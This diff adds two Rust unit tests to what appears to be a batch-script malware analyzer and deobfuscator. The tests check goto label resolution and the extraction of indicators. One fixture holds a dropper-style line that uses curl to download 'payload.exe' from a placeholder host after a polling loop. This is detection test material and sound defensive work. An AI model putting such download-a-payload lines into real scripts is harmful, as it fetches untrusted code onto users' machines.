@@ -11739,6 +11739,61 @@ mod goto_tests {
             .any(|t| matches!(t, Trait::GotoUnresolved { .. }));
         assert!(has, "no GotoUnresolved trait: {:?}", report.traits);
     }
+
+    #[test]
+    fn goto_resolves_forward_label_declaration_with_trailing_colon() {
+        use crate::traits::Trait;
+
+        let script = b"goto checkshit\r\necho DECOY\r\n:checkshit:\r\necho REAL\r\n";
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.deobfuscated.contains("echo REAL"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("DECOY"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::GotoUnresolved { to_label, .. } if to_label == "checkshit"
+            )),
+            "trailing-colon label should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn goto_backward_trailing_colon_polling_loop_falls_through_for_static_iocs() {
+        use crate::traits::Trait;
+
+        let script = b":rdlcheck:\r\nif exist C:\\missing\\rdl.exe goto found\r\ngoto rdlcheck\r\n:found:\r\ncurl https://example.test/payload.exe -o payload.exe\r\n";
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::GotoUnresolved { to_label, .. } if to_label == "rdlcheck"
+            )),
+            "backward polling loop should remain unresolved for static fallthrough: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://example.test/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "fallthrough IOC after polling loop was lost: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
